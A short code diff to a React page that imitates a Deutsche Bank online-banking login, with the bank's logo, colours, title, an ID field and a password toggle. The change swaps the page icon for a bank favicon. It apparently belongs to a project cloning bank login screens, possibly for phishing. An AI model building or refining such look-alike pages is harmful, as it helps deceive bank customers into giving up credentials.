@@ -6,6 +6,7 @@ import { usePageMeta } from "@/hooks/use-page-meta";
 import { Info, AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
 import bgAsset from "@/assets/deutsche-bank-bg.jpg.asset.json";
 import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
+import faviconAsset from "@/assets/favicons/deutsche-bank.png.asset.json";
 import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";
 
 const BLUE = "#0018a8";
@@ -181,7 +182,7 @@ const DeutscheBank = () => {
   const t = COPY[lang];
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Deutsche Bank – Online-Banking", logoAsset.url);
+  usePageMeta("Deutsche Bank – Online-Banking", faviconAsset.url);
 
   const handleContinue = () => {
     if (dbId.trim().length === 0) return;
